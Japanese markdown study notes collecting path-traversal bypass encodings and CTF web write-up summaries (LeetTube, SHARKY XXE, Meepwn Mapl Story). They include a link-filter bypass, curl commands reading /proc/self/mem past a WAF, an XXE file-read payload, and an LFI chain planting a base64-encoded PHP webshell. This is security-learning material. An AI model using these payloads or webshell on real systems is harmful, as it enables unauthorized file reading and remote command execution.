<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [概要](#%E6%A6%82%E8%A6%81)
- [writeup](#writeup)
  - [bypass filter "." with "%E3%80%82" (hackerone)](#bypass-filter--with--hackerone)
  - [python / bypass nginx WAF with "?" / "/proc/self/maps" (ångstromCTF 2020 - LeetTube)](#python--bypass-nginx-waf-with---procselfmaps-%C3%A5ngstromctf-2020---leettube)
  - [XXE (SHARKY CTF 2020 XXEXTERNALXX)](#xxe-sharky-ctf-2020-xxexternalxx)
  - [LFI with /var/lib/php/sessions/sess\_\<PHPSESSID\> / upload base64 webshell "php://filter/convert.base64-decode/resource=" (Meepwn CTF Quals 2018 Mapl Story)](#lfi-with-varlibphpsessionssess%5C_%5Cphpsessid%5C--upload-base64-webshell-phpfilterconvertbase64-decoderesource-meepwn-ctf-quals-2018-mapl-story)
  - [](#)
  - [](#-1)
  - [](#-2)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# 概要
https://security.stackexchange.com/questions/74538/alternative-ways-to-exploit-this-path-traversal/74614#74614  
以下でバイパスできるかも？？  
```txt 
/ %2f %u2215 %252f %c0%af, %e0%80%af, %c0%2f
\ %5c %u2216 %255c %c0%5c, %c0%80%5c
.     %u002e %252e %c0%2e, %e0%40%ae, %c0ae
```
nginx 0.6.36以前ではDirectory Traversalの脆弱性がある。  
https://www.exploit-db.com/exploits/12804  

# writeup
## bypass filter "." with "%E3%80%82" (hackerone)
https://hackerone.com/reports/291750  
- **entrypoint**  
`.`は`%E3%80%82`として`。`のURLエンコードでバイパスできるかもらしい。  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub.com`はLinkがBlockされるけど、`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`で
バイパスできる！  
- **payload**  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`  
## python / bypass nginx WAF with "?" / "/proc/self/maps" (ångstromCTF 2020 - LeetTube)
https://blog.srikavin.me/posts/angstromctf-leettube/  
- **entrypoint**  
ソースの以下の部分がパストラバーラルの脆弱性がある。 
`/videos/../../../`みたいにしてファイルを読みだせる！  
```python
			self.path = urllib.parse.unquote(self.path)
			if self.path.startswith('/videos/'):
				file = os.path.abspath('.'+self.path)
				try: video = open(file, 'rb', 0)
```
ただnginxのWAFが上記のリクエストをフィルタリングして400 bad requestを返してしまう。  
`https://leettube.2020.chall.actf.co/videos/../?/../../`みたいにすると、WAFは`?`以降をクエリとしてそこは見ない。python側では`?`フォルダに一回入ってから`../`で抜けるみたいな意味になるらしい？？  
flagは`flag.txt`みたいな感じじゃなくて`.mp4`に書き込まれてるらしくてメモリ上から抜き出す。  
`/proc/self/maps`でメモリマップ(どのアドレスがどうとか)がわかり、`/proc/self/mem`で実際のメモリを呼び出せるらしい。  
以下のように`Range`ヘッダで指定したアドレスを抜き出せるっぽい？？？  
これで`.mp4`のヘッダを表す`66 74 79 70`というパターンを見つけるとFlagがある。  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
- **payload**  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
## XXE (SHARKY CTF 2020 XXEXTERNALXX)
https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/  
- **entrypoint**  
`?xml=aaaa`としてURLでアクセスすると`file_get_contents(aaaa): failed to open stream: No such file or directory`というエラーが表示されることから、`aaaa`をファイルとして開こうとしていることがわかる。  
また、`loadXML(): Empty string supplied as input`とかのerrorも出ており、開いたファイルをXML解析しようとしていることがわかる。つまり、XXEすればよい！  
`file_get_contents`は`http://`みたいに外部のURLを指定してもOK。  
以下のXXEのためのファイルを攻撃者サーバーに用意しておいてアクセスさせる。  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
- **payload**  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
## LFI with /var/lib/php/sessions/sess\_\<PHPSESSID\> / upload base64 webshell "php://filter/convert.base64-decode/resource=" (Meepwn CTF Quals 2018 Mapl Story)
https://ctftime.org/writeup/10418  
https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html  
- **entrypoint**  
`include($_GET['page'])`で明らかにLFIができるが、GET,POST経由のデータはすべて`(`,`)`,`//`,`` ` ``が削除されている。  
`?page=/etc/passwd`みたいにはできる。  
`flag.txt`みたいな感じでフラグはなくて、どっかにあるのでRCEして探す必要があるのが前提。  
`/var/lib/php/sessions/sess_<PHPSESSID>`にあるセッションファイルにアクセスすると、何らかの暗号化されたデータ的なのがあって、それを使ってCookieにある`hash('sha256','admin'.$salt)`で生成されている文字列の`$salt`を復号するらしい。  
これを復号してadminとしてログインする。  
adminは`"uploads/".md5($salt.$email)."/command.txt`に任意の19文字以内の文字を書き込めるらしい。ただし、GET,POST経由では`(`,`)`,`//`,`` ` ``が削除されるので、``<?=`$_GET[1]`;``などの最短のwebshellは設置できない…。  
`<?=include"$_COOKIE[0]`を書き込めば、COOKIEから値を読みだすので`(`とかは削除されなくなる！！  
ただし`include`関数ではRCEできないので、`command.txt`に書き込んだBase64エンコードしたWebshellを`sess_<PHPSESSID>`に書き込んだincludeで読み込みたい！  
つまり、`sess_<PHPSESSID>`に`<?=include"$_COOKIE[0]`を書き込んで、`?page=/var/lib/php/sessions/sess_<PHPSESSID>`でLFIして`include`関数を実行する。  
その引数はCOOKIE経由で渡し、内容は`php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'`で`command.txt`には``<?=`$_GET[1]`;``がbase64 encodeされたものが書かれている。  
```txt
// ほんとはcommand.txtに<?=`$_GET[1]`;を書き込みたいがそれができないのでbase64エンコードしたものを書き込んでおいてそれをデコードする
// これだと中身がbase64エンコードされたものをincludeするのでダメ
include("upload/56cea464131b6903185abfe3d6103385/command.txt")

// これで中身がbase64デコードしてからincludeできる
include("php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt")

// 以下みたいなことはどうやらできないらしい…。
include("php://filter/convert.base64-decode/resource=data:text/plain,base64,PD89YCRfR0VUWzFdYDs=")
// これはdata://がallow_url_includeが0になっており禁止されている。そもそもこれができるならRFIできる
include("data://text/plain,%3C%3F%3D%60%24_GET%5B1%5D%60%3B)
```
したがって、以下のように`ls`コマンドを実行できるらしい。  
```txt
Ξ ~ → curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'      
character_name|s:96:"d1f197d11ed6b3d29f08a9893429eb2bfa19e4543ff1d33bf19c5a89aec19b45080a355c37b4654ec2a5813f81dbe98b";user|s:96:"917467323f3a8e09ab1c2a2d7e3dc3ac85c0c4f08622b7e10a4ec4a18ad36e9919326131b516d9053ee8980a1230ad0e";action|s:65:"[02:27:52am GMT+7] gave blackpig to player admin.php
assets
character.php
dbconnect.php
die.php
game.php
home.php
index.php
login.php
logout.php
mapl_library.php
register.php
setting.php
style.css
upload
1
```
- **payload**  
`/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24`  
```txt
<?=include"$_COOKIE[0]
```
`upload/56cea464131b6903185abfe3d6103385/command.txt`  
(``<?=`$_GET[1]`;``のBase64エンコード)  
```txt
PD89YCRfR0VUWzFdYDs=
```
以下でlsコマンドを実行  
```txt
curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'   
```
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# メモ
https://www.hamayanhamayan.com/entry/2020/08/30/110845  
